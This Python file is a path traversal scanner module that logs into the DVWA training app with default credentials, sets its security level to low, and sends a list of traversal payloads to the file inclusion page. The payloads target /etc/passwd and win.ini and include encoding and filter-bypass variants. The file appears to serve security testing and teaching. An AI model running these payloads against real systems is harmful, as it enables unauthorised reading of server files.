"""
Path Traversal Scanner Module
"""
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from src.utils.logger import setup_logger

class PathTraversalScanner:
    def __init__(self, session, target_url, verbose=False):
        self.session = session
        self.target_url = target_url
        self.verbose = verbose
        self.logger = setup_logger(verbose)
        self.vulnerabilities_found = []

    def dvwa_login(self):
        """Login to DVWA (reused from other scanners)"""
        try:
            self.logger.info("🔐 Attempting to login to DVWA...")
            login_url = urljoin(self.target_url, "/login.php")
            get_response = self.session.get(login_url)
            if get_response.status_code != 200:
                self.logger.error(f"❌ Failed to access login page. Status: {get_response.status_code}")
                return False
            soup = BeautifulSoup(get_response.text, 'html.parser')
            csrf_token_input = soup.find('input', {'name': 'user_token'})
            if not csrf_token_input:
                self.logger.error("❌ Could not find CSRF token on login page")
                return False
            csrf_token = csrf_token_input.get('value')
            self.logger.debug(f"📋 Found CSRF token: {csrf_token}")
            login_data = {
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": csrf_token
            }
            post_response = self.session.post(login_url, data=login_data)
            if "Login failed" in post_response.text:
                self.logger.error("❌ Login failed - Incorrect username/password")
                return False
            elif "PHPSESSID" in self.session.cookies:
                self.logger.info("✅ Successfully logged into DVWA")
                self.set_dvwa_security_low()
                return True
            else:
                self.logger.error("❌ Login failed - Unknown reason")
                return False
        except Exception as e:
            self.logger.error(f"💥 Login error: {str(e)}")
            return False

    def set_dvwa_security_low(self):
        """Set DVWA security to low"""
        try:
            security_url = urljoin(self.target_url, "/security.php")
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_token_input = soup.find('input', {'name': 'user_token'})
            if not csrf_token_input:
                self.logger.warning("⚠️ Could not find CSRF token on security page")
                return
            csrf_token = csrf_token_input.get('value')
            security_data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": csrf_token
            }
            response = self.session.post(security_url, data=security_data)
            if "Security level is currently: low" in response.text:
                self.logger.info("✅ DVWA security level set to LOW")
            else:
                self.logger.warning("⚠️ Could not verify security level change")
        except Exception as e:
            self.logger.warning(f"⚠️ Could not set security level: {str(e)}")

    def test_dvwa_path_traversal_page(self):
        """Test DVWA's File Inclusion page for path traversal vulnerabilities"""
        self.logger.info("🎯 Testing DVWA Path Traversal page...")
        self.vulnerabilities_found = []

        if not self.dvwa_login():
            self.logger.error("🚫 Cannot proceed without DVWA login")
            return False

        fi_url = urljoin(self.target_url, "/vulnerabilities/fi/")
        vulnerabilities_found = 0

        # Path traversal payloads (various encodings and techniques)
        payloads = [
            # Basic Linux traversal
            "../../../../etc/passwd",
            "../../../../etc/hosts",
            # Basic Windows traversal
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            # URL encoded
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            # Double URL encoded
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            # Unicode/UTF-8 encoded
            "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            # Path with null byte (old PHP)
            "../../../../etc/passwd%00",
            # Using ....// (bypass)
            "....//....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
            # Absolute paths (if allowed)
            "/etc/passwd",
            "C:\\windows\\win.ini",
        ]

        for payload in payloads:
            try:
                self.logger.debug(f"🧪 Testing payload: {payload}")
                params = {"page": payload}
                response = self.session.get(fi_url, params=params)

                if self.is_path_traversal_successful(response.text, payload):
                    self.logger.warning(f"📂 PATH TRAVERSAL VULNERABILITY FOUND!")
                    self.logger.warning(f"   Payload: {payload}")
                    self.logger.warning(f"   URL: {fi_url}")
                    self.vulnerabilities_found.append({
                        "payload": payload,
                        "url": fi_url,
                        "type": "Path Traversal"
                    })
                    vulnerabilities_found += 1

            except Exception as e:
                self.logger.error(f"❌ Error testing payload {payload}: {str(e)}")

        if vulnerabilities_found > 0:
            self.logger.warning(f"🎯 Found {vulnerabilities_found} Path Traversal vulnerabilities!")
            return True
        else:
            self.logger.info("✅ No Path Traversal vulnerabilities detected")
            return False

    def is_path_traversal_successful(self, response_text, payload):
        """Detect if path traversal succeeded based on response content."""
        # Indicators of successful file read
        indicators = [
            "root:",          # /etc/passwd
            "daemon:",
            "bin:",
            "sys:",
            "[extensions]",   # win.ini
            "for 16-bit app support",
            "localhost",      # /etc/hosts
            "::1",
            "127.0.0.1",
            "# Copyright",    # common in system files
            "Microsoft",      # win.ini
        ]

        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                self.logger.debug(f"   Found indicator: {indicator}")
                return True
        return False